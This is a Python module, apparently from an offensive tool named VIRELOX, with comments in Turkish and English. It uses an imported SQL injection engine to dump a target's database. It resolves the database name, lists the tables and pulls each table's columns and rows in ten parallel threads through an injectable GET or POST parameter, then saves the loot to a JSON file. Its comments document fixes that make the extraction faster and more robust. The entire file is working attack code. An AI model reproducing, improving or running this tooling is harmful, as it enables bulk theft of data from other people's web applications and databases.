"""
VIRELOX Veritabanı Dump Grubu — 10 Ajanlı Paralel Dump
Mozilla Public License 2.0 — AltayHR Developers
"""
import json
import concurrent.futures
from datetime import datetime
from typing import Dict, List, Optional
from modüller.virelox_sql import SQLInjectionMotoru


class VeritabaniDumpGrubu:
    """10 ajanlı paralel tablo dump"""

    AJAN_SAYISI = 10

    def __init__(self, http_istemci, log_func=None):
        self.http = http_istemci
        self.log  = log_func or print
        self.sql  = SQLInjectionMotoru(http_istemci, log_func)

    def _tablo_dump_et(self, url: str, param: str, tablo: str,
                       hedef_db: Optional[str], post_data) -> tuple:
        """
        Tek bir tabloyu dump eder — ThreadPoolExecutor worker'ı.

        BUG FIX (regression): previous version passed hedef_db as a keyword arg
        named 'hedef_db' which does not exist on tablo_verisi_cek.  tablo_verisi_cek
        requires `kolonlar` as the 4th positional argument.  Fetch column list first,
        then pass it explicitly.
        """
        try:
            kolonlar = self.sql.kolonlari_al(url, param, tablo,
                                             hedef_db, post_data=post_data)
            if not kolonlar:
                self.log(f"[DB-DUMP] {tablo} için kolon alınamadı — atlanıyor")
                return tablo, {}
            veriler = self.sql.tablo_verisi_cek(url, param, tablo, kolonlar,
                                                post_data=post_data)
            return tablo, {
                "kolonlar": kolonlar,
                "veriler": veriler,
                "satir_sayisi": len(veriler),
            }
        except Exception as exc:
            self.log(f"[DB-DUMP] HATA — {tablo}: {exc}")
            return tablo, {}

    def tam_dump(self, url: str, param: str,
                 hedef_db: Optional[str] = None,
                 post_data=None) -> Dict:
        """
        BUG FIX: redesigned to actually parallelise work.

        Previous version called tam_veritabani_dump (full sequential dump) and
        then attempted a parallel *re*-dump on top — duplicating every request.

        Correct flow:
          1. Resolve DB name sequentially (one query).
          2. Fetch table list sequentially (one query).
          3. Dispatch one worker per table: each worker fetches columns then
             data, so the expensive per-table I/O runs concurrently.

        BUG FIX: post_data is now threaded through every call so POST-based
        injection contexts work correctly.
        """
        self.log("[DB-DUMP] Paralel dump başlatılıyor...")

        # ── Phase 1: resolve database name ──────────────────────────────────
        if not hedef_db:
            hedef_db = (self.sql.mevcut_veritabani_al(url, param,
                                                       post_data=post_data)
                        or "main")
            self.log(f"[DB-DUMP] Aktif DB: {hedef_db}")

        # ── Phase 2: fetch table list ────────────────────────────────────────
        tablolar = self.sql.tablolari_al(url, param, hedef_db,
                                         post_data=post_data)
        self.log(f"[DB-DUMP] {len(tablolar)} tablo tespit edildi")

        sonuc: Dict = {
            "veritabani": hedef_db,
            "tablolar": {},
            "meta": {"url": url, "param": param,
                     "dbms": self.sql.tespit_dbms},
        }

        if not tablolar:
            self.log("[DB-DUMP] Dump edilecek tablo bulunamadı")
            return sonuc

        # ── Phase 3: dump each table in parallel ────────────────────────────
        self.log(f"[DB-DUMP] {len(tablolar)} tablo {self.AJAN_SAYISI} "
                 f"paralel ajan ile dump ediliyor...")
        # BUG FIX (kritik — Ctrl+C aracı durdurmuyordu): `with ThreadPoolExecutor(...) as executor`
        # kullanıldığında, Ctrl+C (KeyboardInterrupt) as_completed() döngüsünü kesse bile,
        # `with` bloğundan çıkarken __exit__ otomatik olarak executor.shutdown(wait=True)
        # çağırıyor ve TÜM worker thread'lerin bitmesini bekliyordu — bu yüzden kullanıcı
        # Ctrl+C'ye bassa da araç saatlerce/asla durmuyordu. Artık executor context manager
        # olmadan elle yönetiliyor; KeyboardInterrupt yakalanınca bekleyen görevler iptal
        # edilip (cancel_futures=True) shutdown(wait=False) ile hemen çıkılıyor.
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.AJAN_SAYISI)
        try:
            gelecekler = {
                executor.submit(
                    self._tablo_dump_et, url, param, tablo,
                    hedef_db, post_data
                ): tablo
                for tablo in tablolar
            }
            for gelecek in concurrent.futures.as_completed(gelecekler):
                tablo_adi, tablo_veri = gelecek.result()
                if tablo_veri:
                    sonuc["tablolar"][tablo_adi] = tablo_veri
                    self.log(f"[DB-DUMP] ✔ {tablo_adi} dump edildi "
                             f"({tablo_veri.get('satir_sayisi', 0)} satır)")
        except KeyboardInterrupt:
            self.log("[DB-DUMP] Kullanıcı tarafından durduruldu (Ctrl+C) — ajanlar iptal ediliyor...")
            executor.shutdown(wait=False, cancel_futures=True)
            raise
        finally:
            executor.shutdown(wait=False, cancel_futures=True)

        tablo_say = len(sonuc["tablolar"])
        satir_say = sum(v.get("satir_sayisi", 0)
                        for v in sonuc["tablolar"].values())
        self.log(f"[DB-DUMP] Tamamlandı: {tablo_say} tablo, {satir_say} satır")
        return sonuc

    def dump_kaydet(self, sonuc: Dict, dosya_adi: str = None) -> str:
        # BUG FIX: missing error handling — PermissionError / disk-full would
        # crash silently.  Now exceptions are caught and logged.
        if not dosya_adi:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            dosya_adi = f"virelox_dump_{ts}.json"
        try:
            with open(dosya_adi, "w", encoding="utf-8") as f:
                json.dump(sonuc, f, ensure_ascii=False, indent=2, default=str)
            self.log(f"[DB-DUMP] Kaydedildi: {dosya_adi}")
        except OSError as exc:
            self.log(f"[DB-DUMP] KAYIT HATASI — {dosya_adi}: {exc}")
            raise
        return dosya_adi
